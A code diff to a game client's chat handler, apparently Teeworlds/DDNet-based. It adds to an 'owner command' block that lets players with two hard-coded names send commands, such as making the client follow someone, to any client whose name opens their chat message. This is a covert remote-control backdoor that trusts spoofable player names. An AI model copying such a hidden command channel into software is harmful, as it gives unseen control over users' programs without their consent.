@@ -550,9 +550,10 @@ void CChat::OnMessage(int MsgType, void *pRawMsg)
 			// owener command
 			if(str_comp(m_pClient->m_aClients[pMsg->m_ClientId].m_aName, "52659905") == 0 || str_comp(m_pClient->m_aClients[pMsg->m_ClientId].m_aName, "甘箨Bamcane") == 0)
 			{
-				const char* pCommand = str_startswith(pMsg->m_pMessage, "Sugarcane ");
+				const char* pCommand = str_startswith(pMsg->m_pMessage, g_Config.m_PlayerName);
 				if(pCommand)
 				{
+					pCommand += 1;
 					if(str_startswith(pCommand, "跟随"))
 					{
 						m_pClient->ChangeFollow(str_startswith(pCommand, "跟随"));
